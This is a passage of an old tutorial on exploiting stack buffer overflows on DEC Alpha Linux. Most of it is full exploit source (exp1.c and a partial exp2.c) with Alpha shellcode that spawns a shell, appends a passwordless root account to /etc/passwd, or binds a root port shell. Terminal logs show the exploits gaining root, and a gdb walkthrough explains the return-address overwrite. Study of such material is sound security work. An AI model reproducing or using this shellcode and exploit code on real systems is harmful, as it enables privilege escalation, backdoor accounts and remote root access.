+"\xec\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x80\x54\xed\x47"                   /*   cmoveq   zero,0x6a,v0 */
+"\xe9\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x74\xec\x47"                   /*   cmoveq   zero,0x63,v0 */
+"\xe7\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x90\x04\xe0\x47"                   /*   cmoveq   zero,v0,a0    */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0 */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1 */
+"\xe3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0 */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\xe0\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\xf4\xe2\x47"                   /*   cmoveq   zero,0x17,v0 */
+"\x90\x04\xff\x47"                   /*   cmoveq   zero,zero,a0 */
+"\xdd\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x74\xe7\x47"                   /*   cmoveq   zero,0x3b,v0 */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1 */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2 */
+"\x86\xfd\x1a\x22"                   /*   lda      a0,-634(ra)   */
+"\x8e\xfd\xfa\xb3"                   /*   stl      zero,-626(ra) */
+"\xd7\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+;
+
+
+unsigned char alpha_ret[] = "\x01\x80\x5a\x6b";
+
+/********************************************************************
+ * END PRELIMINARY                                                  *
+ ********************************************************************/
+
+
+/********************************************************************
+ * ALPHA EXPLOIT STUFF                                              *
+ ********************************************************************/
+
+unsigned long
+get_sp(void)
+{
+
+    __asm__("mov $30, $0");
+}
+
+
+int
+aalign(unsigned long *x, int y)
+{
+    /*
+     * Align x to y boundary
+     */
+    unsigned long   z;
+
+
+    z = *x;
+
+    while (1) {
+        if ((z % y) == 0)
+            break;
+        z++;
+    }
+
+    *x = z;
+    return (0);
+}
+
+
+void
+ret_fix(unsigned long *ret, unsigned long offset)
+{
+    unsigned long   i;
+
+
+    i = offset;
+    aalign(&i, ALPHA_INSN_ALGN);
+
+    *ret -= i;
+
+    return;
+}
+
+/********************************************************************
+ * END ALPHA EXPLOIT STUFF                                          *
+ ********************************************************************/
+void
+exp1_Usage(int status)
+{
+
+
+    printf("exp1 : by andrew_darqui of someplace                    \n"
+           "\tUsage:                                        \n"
+           "\t\t./exp1 <shellcode_type> <optional offset>   \n"
+           "\t\t\tShellcode types:                          \n"
+           "\t\t\t1) execve                                 \n"
+           "\t\t\t2) passwd                                 \n"
+           "\t\t\t3) portshell                              \n"
+           "\t\t\t4) portshell + setuid 0                   \n");
+
+    exit(status);
+}
+
+
+int
+main(int argc, char *argv[])
+{
+    unsigned long   ret_addr = 0,
+                    offset = OFFSET;
+    unsigned char *ab = NULL,
+                   *ptr = NULL,
+                   *shellc_ptr = NULL;
+
+
+    if (argc < 2)
+        exp1_Usage(-1);
+
+    switch (atoi(argv[1])) {
+    case 1:
+        {
+            /*
+             * alpha_exec_shellcode
+             */
+            shellc_ptr = alpha_exec_shellcode;
+
+              break;
+        }
+    case 2:
+        {
+              /*
+               * alpha_passwd_shellcode
+               */
+              shellc_ptr = alpha_passwd_shellcode;
+
+              break;
+        }
+    case 3:
+        {
+              /*
+               * alpha_portshellcode
+               */
+              shellc_ptr = alpha_portshellcode;
+
+              break;
+        }
+    case 4:
+        {
+              /*
+               * alpha_pshell_setuid
+         */
+        shellc_ptr = alpha_pshell_setuid;
+
+        break;
+    }
+default:
+    {
+        /*
+         * Incorrect shellcode value
+         */
+        exp1_Usage(-1);
+
+        break;
+    }
+}
+
+if (argc > 2)
+    offset = atol(argv[2]);
+
+/*
+ * Initialize our attack buffer
+ *
+ * <BUFF_SIZE+EXTRA><RA>
+ * ^ rets+shellcode ^return address
+ */
+ab = (unsigned char *) calloc(1, (BUFF_SIZE + EXTRA + RA));
+if (ab == NULL) {
+    perror("main() : calloc() ");
+    exit(-1);
+}
+
+
+/*
+ * <rets><shellcode><evilret> or <specialnops><shellcode><evilret>
+ *
+ * We use a special type of nop:
+ * - ret ra,(ra),0x1
+ *
+ * This will walk its way up to our shellcode
+ */
+for (ret_addr = 0; ret_addr <= (BUFF_SIZE + EXTRA + RA); ret_addr += 4)
+    memcpy((ab + ret_addr), alpha_ret, 4);
+
+/*
+ * Point 'ptr' to the area where our shellcode will be
+ */
+ptr = (ab + BUFF_SIZE + EXTRA);
+ptr -= strlen(shellc_ptr);
+
+/*
+ * Place our shellcode in the attack buffer (at ptr)
+ */
+memcpy(ptr, shellc_ptr, strlen(shellc_ptr));
+
+/*
+ * Get a relative stack address, then fix it up with our offset
+ */
+ret_addr = get_sp();
+ret_fix(&ret_addr, offset);
+
+printf("Using return address [0x%lx]\n"
+       "Shellcode is %ld bytes.\n", ret_addr, strlen(shellc_ptr));
+    *(unsigned long *) (ab + BUFF_SIZE + EXTRA) = ret_addr;
+
+    execlp("./lvuln", "lvuln", ab, (char *) NULL);
+
+    return (0);
+}
+
++END exp1.c
+
+      Compile exp1.c:
+
+              $ gcc exp1.c -o exp1
+
+[andrew_darqui@blah exp]$ ./exp1
+exp1 : by andrew_darqui of someplace
+        Usage:
+                ./exp1 <shellcode_type> <optional offset>
+                        Shellcode types:
+                        1) execve
+                        2) passwd
+                        3) portshell
+                        4) portshell + setuid 0
+
+*** Using the execve a /bin/ash shellcode ***
+[andrew_darqui@blah exp]$ ./exp1 1
+Using return address [0x11ffff8b0]
+Shellcode is 68 bytes.
+# id
+uid=0(root) gid=504(andrew_darqui) egid=0(root) groups=504(andrew_darqui)
+# exit
+
+      It worked! But lets see how it worked! We are now going
+      to gdb ./lvuln, assemble the stack, go through it step
+      by step, so you know what is going on!
+
+[andrew_darqui@blah exp]$ gdb ./lvuln
+GNU gdb 4.17.0.11 with Linux support
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "alpha-redhat-linux"...
+(gdb) disass main
+Dump of assembler code for function main:
+0x1200004a0 <main>:     ldah    gp,17(t12)
+0x1200004a4 <main+4>:   lda     gp,-32384(gp)
+0x1200004a8 <main+8>:   subq    sp,0x30,sp
+0x1200004ac <main+12>: stq      ra,0(sp)
+0x1200004b0 <main+16>: stq      fp,8(sp)
+0x1200004b4 <main+20>: mov      sp,fp
+0x1200004b8 <main+24>: mov      a0,t0
+0x1200004bc <main+28>: stq      a1,24(fp)
+0x1200004c0 <main+32>: stl      t0,16(fp)
+0x1200004c4 <main+36>: ldl      t0,16(fp)
+0x1200004c8 <main+40>: cmple    t0,0x1,t1
+0x1200004cc <main+44>: bne      t1,0x1200004e0 <main+64>
+0x1200004d0 <main+48>: ldq      t1,24(fp)
+0x1200004d4 <main+52>: addq     t1,0x8,t0
+0x1200004d8 <main+56>: ldq      a0,0(t0)
+0x1200004dc <main+60>: bsr      ra,0x120000448 <vuln+8>
+0x1200004e0 <main+64>: mov      0x1,t0
+0x1200004e4 <main+68>: stl      t0,32(fp)
+0x1200004e8 <main+72>: clr      v0
+0x1200004ec <main+76>: br       0x1200004f0 <main+80>
+0x1200004f0 <main+80>: mov      fp,sp
+0x1200004f4 <main+84>: ldq      ra,0(sp)
+0x1200004f8 <main+88>: ldq      fp,8(sp)
+0x1200004fc <main+92>: addq     sp,0x30,sp
+0x120000500 <main+96>: ret      zero,(ra),0x1
+End of assembler dump.
+(gdb) disass vuln
+Dump of assembler code for function vuln:
+0x120000440 <vuln>:     ldah    gp,17(t12)
+0x120000444 <vuln+4>:   lda     gp,-32288(gp)
+0x120000448 <vuln+8>:   lda     sp,-544(sp)
+0x12000044c <vuln+12>: stq      ra,0(sp)
+0x120000450 <vuln+16>: stq      fp,8(sp)
+0x120000454 <vuln+20>: mov      sp,fp
+0x120000458 <vuln+24>: stq      a0,16(fp)
+0x12000045c <beg>:      addq    fp,0x18,t0
+0x120000460 <beg+4>:    mov     t0,a0
+0x120000464 <beg+8>:    ldq     a1,16(fp)
+0x120000468 <beg+12>:   ldq     t12,-32728(gp)
+0x12000046c <beg+16>:   jsr     ra,(t12),0x120000614
+0x120000470 <beg+20>:   ldah    gp,17(ra)
+0x120000474 <beg+24>:   lda     gp,-32336(gp)
+0x120000478 <beg+28>:   bsr     ra,0x120000400 <noop>
+0x12000047c <end>:      clr     v0
+0x120000480 <end+4>:    br      0x120000484 <end+8>
+0x120000484 <end+8>:    mov     fp,sp
+0x120000488 <end+12>:   ldq     ra,0(sp)
+0x12000048c <end+16>:   ldq     fp,8(sp)
+0x120000490 <end+20>:   lda     sp,544(sp)
+0x120000494 <end+24>:   ret     zero,(ra),0x1
+End of assembler dump.
+
+      The only thing this dump does not tell us is the return address
+      of main, and in this example that is very important, because
+      we are changing the return address of main :)
+
+(gdb) b *main
+Breakpoint 1 at 0x1200004a0
+(gdb) r
+Starting program: /home/andrew_darqui/local/exp/./lvuln
+
+Breakpoint 1, 0x1200004a0 in main ()
+*** the return address of main() ***
+(gdb) x $ra
+0x2000014ffb0 <__libc_start_main+336>: 0x27ba0020
+(gdb) x/i $ra
+0x2000014ffb0 <__libc_start_main+336>: ldah     gp,32(ra)
+(gdb) x/i $ra-4
+0x2000014ffac <__libc_start_main+332>:
+    jsr ra,(t12),0x2000014ffb0 <__libc_start_main+336>
+
+      The return address of main is:
+
+             0x2000014ffb0
+
+      Since pointers and addresses are quadwords, the return address of
+      main is actually:
+
+             0x000002000014ffb0
+
+      The next diagram is the stack without any saved procedure
+      information on it (we will fill this in, in a bit):
+
+stack outline (same exact diagram as the one b4 exp1.c posting)
+---------------------------------------------------------------
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local                      S   40(fp) local quad4
+S----------------------------S
+S int i                      S   32(fp) local quad3
+S----------------------------S
+S local                      S   24(fp) local quad2
+S----------------------------S
+S local                      S   16(fp) local quad1
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S saved ra                   S   0(fp)
+S----------------------------S   <- main()'s frame
+::::::::::::::::::::::::::::::
+::::::::::::::::::::::::::::::
+::::::::::::::::::::::::::::::
+S----------------------------S   <- vuln()'s frame
+S local (padding)            S   536(fp) (536-544)
+S----------------------------S
+S buffer                     S   280 - 536(fp)
+S----------------------------S
+S buffer                     S   24 - 280(fp) (begin of buffer address)
+S----------------------------S
+S local (tmp, used for arg) S    16(fp)
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S saved ra                   S   0(fp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      main() is called from:
+
+0x000002000014ffac <__libc_start_main+332>:
+    jsr ra,(t12),000000x2000014ffb0 <__libc_start_main+336>
+
+      The updated pc of [0x000002000014ffac] is 0x000002000014ffb0.
+      The updated pc is where main() must return to:
+
+0x000002000014ffb0 <__libc_start_main+336>:      ldah   gp,32(ra)
+
+      The procedure main() calls vuln() from 0x00000001200004dc.
+
+0x00000001200004dc <main+60>:    bsr      ra,0x0000000120000448 <vuln+8>
+
+      The updated pc stored in register ra is 0x00000001200004e0.
+
+0x00000001200004e0 <main+64>:    mov      0x1,t0
+
+      When procedure vuln() returns, it will transfer control back to
+      0x00000001200004e0.
+
+0x00000001200004e0 <main+64>:    mov      0x1,t0
+      When procedure main() returns, it will transfer control back to
+      0x000002000014ffb0.
+
+0x000002000014ffb0 <__libc_start_main+336>:      ldah   gp,32(ra)
+
+      So with all this said, lets draw up the stack.
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local                      S   40(fp) local quad4
+S----------------------------S
+S int i                      S   32(fp) local quad3
+S----------------------------S
+S local                      S   24(fp) local quad2
+S----------------------------S
+S local                      S   16(fp) local quad1
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S 0x000002000014ffb0         S   0(fp)
+S----------------------------S   <- main()'s frame
+::::::::::::::::::::::::::::::
+::::::::::::::::::::::::::::::
+::::::::::::::::::::::::::::::
+S----------------------------S   <- vuln()'s frame
+S local (padding)            S   536(fp) (536-544)
+S----------------------------S
+S buffer                     S   280 - 536(fp)
+S----------------------------S
+S buffer                     S   24 - 280(fp) (begin of buffer address)
+S----------------------------S
+S local (tmp, used for arg) S    16(fp)
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S 0x00000001200004e0         S   0(fp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      In the above diagram, this is how the stack would look on normal
+      program flow. But in the exploit, we made [lvuln] return to:
+
+             0x11ffff8b0
+
+             Which is the same as:
+
+             0x000000011ffff8b0
+
+             "Using return address [0x11ffff8b0]"
+
+      The new stack looks like:
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local                      S 40(fp) local quad4
+S----------------------------S
+S int i                      S 32(fp) local quad3
+S----------------------------S
+S local                      S   24(fp) local quad2
+S----------------------------S
+S local                      S   16(fp) local quad1
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S 0x000000011ffff8b0         S   0(fp) <---------- :)
+S----------------------------S   <- main()'s frame
+::::::::::::::::::::::::::::::
+::::::::::::::::::::::::::::::
+::::::::::::::::::::::::::::::
+S----------------------------S   <- vuln()'s frame
+S local (padding)            S   536(fp) (536-544)
+S----------------------------S
+S buffer                     S   280 - 536(fp)
+S----------------------------S
+S buffer                     S   24 - 280(fp) (begin of buffer address)
+S----------------------------S
+S local (tmp, used for arg) S    16(fp)
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S 0x00000001200004e0         S   0(fp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      The return address of main() [0x000002000014ffb0] is actually
+      stored like so on the stack (note we are using x/bx $fp, this
+      is just after the mov sp, fp in main()'s procedure prologue. Also,
+      notice how each byte's address gets higher, this is a higher memory
+      address on the stack):
+
+(gdb) x/bx $fp
+1) 0x11ffffc00:   0xb0
+(gdb)
+2) 0x11ffffc01:   0xff
+(gdb)
+3) 0x11ffffc02:   0x14
+(gdb)
+4) 0x11ffffc03:   0x00
+(gdb)
+5) 0x11ffffc04:   0x00
+(gdb)
+6) 0x11ffffc05:   0x02
+(gdb)
+7) 0x11ffffc06:   0x00
+(gdb)
+8) 0x11ffffc07:   0x00
+
+      This is how the return address is stored in the Alpha, using
+      little endian byte ordering. If we were using big endian byte
+      ordering, the reverse would be true.
+
+      Our attack buffer looked like this:
+
+             <rets><shellcode><0x11ffff8b0>
+                               ^^ return address back onto stack
+
+      0x11ffff8b0 stored as a quadword:
+
+1) 0x.......00:   0xb0
+2) 0x.......01:   0xf8
+3) 0x.......02:   0xff
+4) 0x.......03:   0x1f
+5) 0x.......04:   0x01
+6) 0x.......05:   0x00
+7) 0x.......06:   0x00
+8) 0x.......07:   0x00
+
+        We changed the return address too:
+
+(gdb) x/bx $fp
+1) 0x11ffffc00:     0xb0
+(gdb)
+2) 0x11ffffc01:     0xf8
+(gdb)
+3) 0x11ffffc02:     0xff
+(gdb)
+4) 0x11ffffc03:     0x1f
+(gdb)
+5) 0x11ffffc04:     0x01
+(gdb)
+6) 0x11ffffc05:     0x00 <----------- NULL byte, was 0x02
+(gdb)
+7) 0x11ffffc06:     0x00
+(gdb)
+8) 0x11ffffc07:     0x00
+
+
+        The reason 0x02 was removed is because, strcpy() NULL terminates
+        the vulnerable buffer. The diagram below shows how the stack of
+        the vulnerable program and our attack buffer overlap:
+
+stack:
+<saved ret><saved fp><local tmp><buffer><local pad><saved ret of main      >
+<..................................................<B0 FF 14 00 00 02 00 00>
+
+attack buffer:
+<untouch><untouch><untouch><rets><execve shellcode><B0 F8 FF 1F 01>
+
+        The stack then becomes:
+
+new stack:
+<saved ret><saved fp><local tmp><rets><exec shellc><B0 F8 FF 1F 01 00 00 00>
+                                 ^^^ 0x000000011ffff8b0
+
+        Referring back to the About Alpha section:
+
+"
+        On a LITTLE ENDIAN -
+         system; within a multi-byte integer (short,int,long,double), the
+         byte with the smallest address is least significant; a byte's
+         significance increases as its address increases. Look at the
+         diagrams below.
+
+         Little Endian:
+                 .-----------------------------------------.
+         Low Addr| 0x88 0x77 0x66 0x55 0x44 0x33 0x22 0x11 |High Addr
+                 `-----------------------------------------'
+"
+
+        The original return address of main():
+
+         Little Endian:
+                 .-----------------------------------------.
+       Low Addr| 0xB0 0xFF 0x14 0x00 0x00 0x02 0x00 0x00 |High Addr
+               `-----------------------------------------'
+                 ^^^ least significant byte
+
+      Evil return address:
+
+       Little Endian:
+               .-----------------------------------------.
+       Low Addr| 0xB0 0xF8 0xFF 0x1F 0x01 0x00 0x00 0x00 |High Addr
+               `-----------------------------------------'
+                 ^^^ least significant byte
+
+      With all that said, we can overwrite the least significant bytes
+      of the return address. Usually the return addresses contain many
+      NULLs, so we end up overwriting the 5 least significant bytes of
+      the return address. If there are pointers on the stack we must
+      overwrite, it is pretty impossible since they will contain NULLs,
+      and we only get one chance at overwriting the least significant
+      bytes of some address. An approach to this, for example, would be
+      to overwrite the least significant bytes of a function pointer's
+      address.
+
+      An important note, the reason all of the text address seem different
+      then main()'s return address, is because 0x000002000014FFB0 is an
+      address used by the dynamic linker. Usually you will encounter
+      address more along the lines of 0x00000001200004e0. Returning back
+      into a stack address shouldn't be a problem.
+
+      Basically, all we had to know was how to write an efficient
+      shellcode and overwrite the return address of an Alpha procedure.
+      Once we have got this down, we know how to exploit Alpha
+      stack based buffer overflows.
+
+*** Test using the passwd appending shellcode ***
+[andrew_darqui@blah exp]$ ./exp1 2
+Using return address [0x11ffff8b0]
+Shellcode is 108 bytes.
+[andrew_darqui@blah exp]$ tail -n 1 /etc/passwd
+x::0:0::/:/bin/sh
+
+*** Test using the portshell (without setuid) ***
+[andrew_darqui@blah exp]$ ./exp1 3
+Using return address [0x11ffff8b0]
+Shellcode is 164 bytes.
+
+OTHER TERM:
+otherhost$ telnet vulnhost 39705
+Trying 12.34.56.78...
+Connected to vulnhost.
+Escape character is '^]'.
+id;
+uid=504(andrew_darqui) gid=504(andrew_darqui) euid=0(root) egid=0(root)
+groups=504(andrew_darqui)
+ls;
+Makefile
+a.out
+core
+exp.c
+exp1
+exp1.c
+fmt
+fmttest.c
+ideas
+lvuln
+lvuln.c
+o.c
+oldexp1.c
+sh
+vuln
+vuln.c
+exit;
+Connection closed by foreign host.
+
+*** Test using portshell with setuid ***
+[andrew_darqui@blah exp]$ ./exp1 4
+Using return address [0x11ffff8b0]
+Shellcode is 176 bytes.
+: not found
+
+OTHER TERM:
+otherhost$ telnet vulnhost 39705
+Trying 12.34.56.78...
+Connected to vulnhost.
+Escape character is '^]'.
+id;
+uid=0(root) gid=504(andrew_darqui) egid=0(root) groups=504(andrew_darqui)
+exit;
+Connection closed by foreign host.
+
+        Here's exp2.c, it exploits lvuln.c when lvuln.c is compiled
+        with an optimization level of 1 -O1. Check the comments :)
+
+                   # gcc lvuln.c -O1 -o lvuln
+
+                   # chown root ./lvuln
+
+                   # chmod +s ./lvuln
+
+                   $ ls -al ./lvuln
+                   -rwsrwsr-x   1 root      root       155434 Sep 22 23:23 ./lvuln
+
++BEGIN exp2.c
+
+/*
+ * exp2 - Exploit for `lvuln.c'
+ *
+ * For use when lvuln.c is compiled with -O1
+ *
+ * by andrew_darqui of someplace
+ */
+
+
+/*
+ *   0x120000428   <vuln+8>:    lda     sp,-656(sp)
+ *   0x12000042c   <vuln+12>:   stq     ra,0(sp)
+ *   0x120000430   <vuln+16>:   mov     a0,a1
+ *   0x120000434   <beg>:       addq    sp,0x10,a0
+ *   0x120000438   <beg+4>:     ldq     t12,-32728(gp)
+ *   0x12000043c   <beg+8>:     jsr     ra,(t12),0x120000594
+ *
+ *   656 - 0x10 = 640
+ *
+ *   Same code, all we have to do is change:
+ *
+ *   BUFF_SIZE to 640
+ *
+ * EXTRA        to 0
+*/
+
+
+#include   <stdio.h>
+#include   <stdlib.h>
+#include   <string.h>
+#include   <unistd.h>
+
+
+/********************************************************************
+ * PRELIMINARY                                                      *
+ ********************************************************************/
+
+#define   BUFF_SIZE         640
+#define   EXTRA             0
+#define   RA                8
+#define   OFFSET            800
+#define   ALPHA_ADDR_ALGN   8
+#define   ALPHA_INSN_ALGN   4
+
+
+unsigned char alpha_exec_shellcode[] = /* XXX shellcode by andrew_darqui */
+
+                                      /*   NOTE:       exec /bin/ash */
+"\x9a\x02\x5a\x23"                    /*   lda         ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                    /*   stl         zero,-653(ra) */
+"\x86\xfd\x3a\x21"                    /*   lda         s0,-634(ra)   */
+"\x83\xff\xff\xff"                    /*   data        (callsys)     */
+"\xff\xff\xff\xff"                    /*   data        (bgt)         */
+"\x01\x80\xe9\x6b"                    /*   ret         zero,(s0),0x1 */
+"\x2f\x62\x69\x6e"                    /*   data                      */
+"\x2f\x61\x73\x68"                    /*   data                      */
+"\x80\xf4\xe2\x47"                    /*   cmoveq      zero,0x17,v0 */
+"\x90\x04\xff\x47"                    /*   cmoveq      zero,zero,a0 */
+"\xf8\xff\x3f\xd1"                    /*   bsr         s0,CALLSYS    */
+"\x80\x74\xe7\x47"                    /*   cmoveq      zero,0x3b,v0 */
+"\x86\xfd\xfa\xb3"                    /*   stl         zero,-634(ra) */
+"\x7e\xfd\x1a\x22"                    /*   lda         a0,-642(ra)   */
+"\x91\x04\xff\x47"                    /*   cmoveq      zero,zero,a1 */
+"\x92\x04\xff\x47"                    /*   cmoveq      zero,zero,a2 */
+"\xf2\xff\x3f\xd1"                    /*   bsr         s0,CALLSYS    */
+;
+
+
+unsigned char alpha_passwd_shellcode[] =
+                                           /* XXX shellcode by andrew_darqui */
+
+"\x9a\x02\x5a\x23"                         /*   lda     ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                         /*   stl     zero,-653(ra) */
+"\xa2\xfd\x3a\x21"                         /*   lda     s0,-606(ra)   */
+"\x83\xff\xff\xff"                         /*   data                  */
+"\xff\xff\xff\xff"                         /*   data                  */
+"\x01\x80\xe9\x6b"                         /*   ret     zero,(s0),0x1 */
+"\x2f\x65\x74\x63"                         /*   data                  */
+"\x2f\x70\x61\x73"                         /*   data                  */
+"\x73\x77\x64\xff"                         /*   data                  */
+"\xff\xff\xff\x78"                         /*   data                  */
+"\x3a\x3a\x30\x3a"                         /*   data                  */
+"\x30\x3a\x3a\x2f"                         /*   data                  */
+"\x3a\x2f\x62\x69"                         /*   data                  */
+"\x6e\x2f\x73\x68"                         /*   data                  */
+"\x0a\xff\xff\xff"                         /*   data                  */
+"\x80\xb4\xe5\x47"                        /*   cmoveq   zero,0x2d,v0    */
+"\x7e\xfd\x1a\x22"                        /*   lda      a0,-642(ra)     */
+"\x89\xfd\xfa\xb3"                        /*   stl      zero,-631(ra)   */
+"\x91\x54\xe1\x47"                        /*   cmoveq   zero,0xa,a1     */
+"\xef\xff\x3f\xd1"                        /*   bsr      s0, CALLSYS     */
+"\x90\x04\xe0\x47"                        /*   cmoveq   zero,v0,a0      */
+"\x80\x94\xe0\x47"                        /*   cmoveq   zero,0x4,v0     */
+"\x8d\xfd\x3a\x22"                        /*   lda      a1,-627(ra)     */
+"\x92\x54\xe2\x47"                        /*   cmoveq   zero,0x12,a2    */
+"\xea\xff\x3f\xd1"                        /*   bsr      s0, CALLSYS     */
+"\x80\x34\xe0\x47"                        /*   cmoveq   zero,0x1,v0     */
+"\xe8\xff\x3f\xd1"                        /*   bsr      s0, CALLSYS     */
+;
+
+
+unsigned char alpha_portshellcode[] = /* XXX shellcode by andrew_darqui */
+
+                                     /*   NOTE:    exec's ash    */
+"\x9a\x02\x5a\x23"                   /*   lda      ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                   /*   stl      zero,-653(ra) */
+"\x92\xfd\x3a\x21"                   /*   lda      s0,-622(ra)   */
+"\x83\xff\xff\xff"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x01\x80\xe9\x6b"                   /*   ret      zero,(s0),0x1 */
+"\xff\xff\x9b\x19"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x2f\x62\x69\x6e"                   /*   data                   */
+"\x2f\x61\x73\x68"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x80\x34\xec\x47"                   /*   cmoveq   zero,0x61,v0 */
+"\x90\x54\xe0\x47"                   /*   cmoveq   zero,0x2,a0   */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2 */
+"\xf3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x81\x04\xe0\x47"                   /*   cmoveq   zero,v0,t0    */
+"\x82\xfd\xfa\xb3"                   /*   stl      zero,-638(ra) */
+"\x80\x14\xed\x47"                   /*   cmoveq   zero,0x68,v0 */
+"\x90\x04\xe1\x47"                   /*   cmoveq   zero,t0,a0    */
+"\x7e\xfd\x3a\x22"                   /*   lda      a1,-642(ra)   */
+"\x92\x14\xe2\x47"                   /*   cmoveq   zero,0x10,a2 */
+"\xec\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x80\x54\xed\x47"                   /*   cmoveq   zero,0x6a,v0 */
+"\xe9\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x74\xec\x47"                   /*   cmoveq   zero,0x63,v0 */
+"\xe7\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x90\x04\xe0\x47"                   /*   cmoveq   zero,v0,a0    */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0 */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1 */
+"\xe3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0 */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\xe0\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x74\xe7\x47"                   /*   cmoveq   zero,0x3b,v0 */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1 */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2 */
+"\x86\xfd\x1a\x22"                   /*   lda      a0,-634(ra)   */
+"\x8e\xfd\xfa\xb3"                   /*   stl      zero,-626(ra) */
+"\xda\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+;
+
+
+unsigned char alpha_pshell_setuid[] = /* XXX shellcode by andrew_darqui */
+                                     /*   NOTE:    exec's ash    */
+"\x9a\x02\x5a\x23"                   /*   lda      ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                   /*   stl      zero,-653(ra) */
+"\x92\xfd\x3a\x21"                   /*   lda      s0,-622(ra)   */
+"\x83\xff\xff\xff"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x01\x80\xe9\x6b"                   /*   ret      zero,(s0),0x1 */
+"\xff\xff\x9b\x19"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x2f\x62\x69\x6e"                   /*   data                   */
+"\x2f\x61\x73\x68"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x80\x34\xec\x47"                   /*   cmoveq   zero,0x61,v0 */
+"\x90\x54\xe0\x47"                   /*   cmoveq   zero,0x2,a0   */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2 */
+"\xf3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x81\x04\xe0\x47"                   /*   cmoveq   zero,v0,t0    */
+"\x82\xfd\xfa\xb3"                   /*   stl      zero,-638(ra) */
+"\x80\x14\xed\x47"                   /*   cmoveq   zero,0x68,v0 */
+"\x90\x04\xe1\x47"                   /*   cmoveq   zero,t0,a0    */
+"\x7e\xfd\x3a\x22"                   /*   lda      a1,-642(ra)   */
+"\x92\x14\xe2\x47"                   /*   cmoveq   zero,0x10,a2 */
+"\xec\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x80\x54\xed\x47"                   /*   cmoveq   zero,0x6a,v0 */
+"\xe9\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x74\xec\x47"                   /*   cmoveq   zero,0x63,v0 */
+"\xe7\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x90\x04\xe0\x47"                   /*   cmoveq   zero,v0,a0    */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0 */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1 */
+"\xe3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0 */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\xe0\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
